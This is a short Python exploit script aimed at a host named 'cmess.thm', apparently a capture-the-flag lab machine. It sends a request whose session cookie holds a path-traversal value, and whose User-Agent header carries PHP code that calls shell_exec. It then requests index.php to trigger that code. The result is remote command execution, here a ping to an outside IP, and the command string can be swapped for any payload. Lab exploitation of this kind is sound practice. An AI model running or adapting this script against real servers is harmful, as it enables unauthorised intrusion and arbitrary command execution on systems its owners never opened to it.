import requests
import time

target_url = "http://cmess.thm"
cmd = "ping 10.6.32.20"

url = target_url+"?c=admin"
cookies = {"GSESSIONID": "../../index.php"}
headers = {"User-Agent": "<?php shell_exec('"+cmd+"'); include 'src\\core\\bootstrap.php';  ?>"}
requests.get(url, headers=headers, cookies=cookies)
time.sleep(5)
requests.get(target_url+"/index.php")